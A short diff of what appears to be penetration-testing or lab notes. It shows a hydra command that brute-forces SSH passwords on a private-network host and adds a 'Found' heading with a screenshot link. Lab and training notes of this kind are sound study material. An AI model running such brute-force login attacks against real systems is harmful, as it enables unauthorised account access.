@@ -107,6 +107,9 @@ EOF
 ```bash
  hydra -L usernames.txt -P /SecLists/Passwords/xato-net-10-million-passwords-1000.txt -t 4 -vV ssh://192.168.23.42 -s 4223
 ```
+### Found
+![image](https://github.com/user-attachments/assets/c6752bcd-4396-4bd1-886d-938243ab85e3)
+
 
 
 
